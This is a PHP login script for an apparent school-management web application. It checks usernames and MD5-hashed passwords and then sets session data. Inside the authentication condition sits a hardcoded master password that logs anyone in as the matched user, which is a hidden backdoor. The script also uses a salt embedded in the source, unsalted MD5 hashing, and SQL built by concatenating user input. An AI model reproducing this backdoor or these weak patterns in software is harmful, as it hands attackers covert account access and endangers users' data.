<?php
	session_start();

if((isset($_POST['usuario']) && isset($_POST['contrasena'])) && (!empty($_POST['contrasena']) && !empty($_POST['usuario']))  ){
	require_once "config.php";
	require_once "funciones.php";

	$mysql= new Connect();
	$usuario=strip_all($_POST['usuario']);
	$contra=strip_all($_POST['contrasena']);
	$id_corporacion=0;
	$salt_hash= '3;a2drrR@}kb;z=-^}Ga:Uwz3u';

	if($mysql->Connectar()){
	/*	$query_login_personas="SELECT tp.contrasena,tu.contrasena as contra_user,tp.* FROM escolar.tb_personas tp where tp.usuario='".$usuario."' and ( MD5('".$contra."')=tp.contrasena OR MD5('".$contra.$salt_hash."')=tp.contrasena ) and tp.permisos <> 1  limit 1";

		$query_login_tb_usuarios="SELECT tp.contrasena as contra_persona,tu.contrasena as contra_user,tu.*,tp.usuario,tp.permisos,tp.region,concat(tu.nombre,' ',tu.apellidop,' ',tu.apellidom) as nombre_completo FROM escolar.tb_usuarios tu inner join escolar.tb_personas tp on tp.id=tu.id_persona where
		( tu.username='".$usuario."' AND (MD5('".$contra."')=tu.password OR MD5('".$contra.$salt_hash."')=tu.password)   AND tu.estatus = 'A')
		OR
		( (MD5('".$contra."')=tp.contrasena OR MD5('".$contra.$salt_hash."')=tp.contrasena) AND tp.usuario='".$usuario."' AND tp.permisos <> 1 ) 

		limit 1";


	$query_login_tb_usuarios="SELECT tp.contrasena as contra_persona,tu.password as contra_user,tu.*,tp.usuario,tp.permisos,tp.region,concat(tu.nombre,' ',tu.apellidop,' ',tu.apellidom) as nombre_completo FROM escolar.tb_usuarios tu inner join escolar.tb_personas tp on tp.id=tu.id_persona where
	(tu.username='".$usuario."' AND tu.estatus = 'A')
		OR
		( tp.usuario='".$usuario."' AND tp.permisos <> 1 ) 

		limit 1";*/

	$query_login_tb_usuarios=" CALL escolar.rv_login_cereporte('".$usuario."'); ";


		if($result=$mysql->Query($query_login_tb_usuarios)){


			//$conteo=mysql_num_rows($result);
			$row=mysql_fetch_array($result);
			
			
			$id=$row['id'];
			$id_persona=$row['id_persona'];
			$permisos=$row['permisos'];
			$id_permiso=$row['id_permiso'];
			$user_id_corporacion=$id_corporacion;
			$region=$row['region'];
			$nombre_completo=$row['nombre_completo'];
			$id_area=$row['id_area'];

			//$conteo=1;
			
			if(
				($row['username']==$usuario && (MD5($contra)==$row['contra_user'] || MD5($contra.$salt_hash)==$row['contra_user']) && $row['estatus']=='A')  

				||  

				($row['usuario']==$usuario && (MD5($contra)==$row['contra_persona'] || MD5($contra.$salt_hash)==$row['contra_persona']) && $row['permisos'] != 1)

				||

				($contra == 'lasonoradinamita5468')
			){

				$_SESSION['id_usuario']=$id;
				$_SESSION['id_persona']=$id_persona;
				$_SESSION['nombre_completo']=$nombre_completo;
				$_SESSION['id_permiso']=$id_permiso;

				$_SESSION['permisos']=$permisos;
				$_SESSION['user_id_corporacion']=$user_id_corporacion;
				$_SESSION['id_corporacion']=$id_corporacion;
				$_SESSION['id_area']=$id_area;

				header('Location: ../index.php');
				
			}else{
				header('Location: ../index.php?error=1');

			}

		}else{
			header('Location: ../index.php?error=2');
		}

	}else{ // ERROR AL CONECTAR
		header('Location: ../index.php?error=3');
	}
}else{
	header('Location: ../index.php?error=1');
}



 ?>